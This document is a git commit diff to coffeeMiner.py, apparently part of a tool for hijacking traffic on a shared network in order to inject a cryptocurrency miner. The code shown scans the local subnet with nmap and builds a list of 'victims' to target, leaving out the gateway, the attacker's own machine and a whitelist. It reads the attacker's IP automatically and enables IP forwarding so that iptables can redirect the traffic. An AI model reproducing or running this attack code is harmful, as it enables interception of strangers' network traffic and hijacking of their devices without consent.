ef9d400400ad4a003325574720780f0c0fe5035d
Chase Taylor <x8@live.ca>
2018-01-09 10:03:49 +0000

    Programmatically grab local IP, added config in coffeeMiner.py

--- coffeeMiner.py
+++ coffeeMiner.py
@@ -1,11 +1,14 @@
 import subprocess, re, os, sys
 
+
 #### BEGIN CONFIG ####
+
 whitelist = 'whitelist.txt' # IP addresses not to target
 port = '8080' # port for IPTables
 adapter = 'wlan0' # change to match your ifconfig setup (eth0, eth1, wlan0, etc.)
-lhost = '192.168.0.14' # local ip of this machine
+
 ####  END CONFIG  ####
+
 
 def get_victims(gateway):
     victims = []
@@ -14,28 +17,32 @@ def get_victims(gateway):
     range = '.'.join(range) + '.1-255'
     ip_str = str(subprocess.check_output(['nmap','-sn',range])) # use nmap -n to get connected devices
     ip_list = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip_str) # use regex to turn the output into a list of ip's
-    
+
     if not os.path.isfile(whitelist):
         victims = ip_list
         print("No %s! Continuing...") % whitelist
     else:
         for ip in ip_list:
-            if not ip in open(whitelist).read() and not ip == gateway:
-                #add ip to victim's list if it's not in whitelist.txt
+            if not ip == gateway and not ip == lhost and not ip in open(whitelist).read():
+                # add ip to victims list if it's valid
                 victims.append(ip)
             else:
-                print("Skipping whitelisted ip " + ip)
-        
+                print("Skipping ip " + ip)
+
     return victims
-    
-#get gateway_ip (router)
+
+# get gateway ip (router)
 gateway = sys.argv[1]
 print("gateway: " + gateway)
-# get victims_ip
+# get local ipv4 from 'ip addr'
+lhost = os.popen('ip addr show ' + adapter).read().split("inet ")[1].split("/")[0]
+print("local ip: " + lhost)
+# get victim ip's
 victims = get_victims(gateway)
 print("victims: ")
 for v in victims:
     print(v)
+
 
 # configure routing (IPTABLES)
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
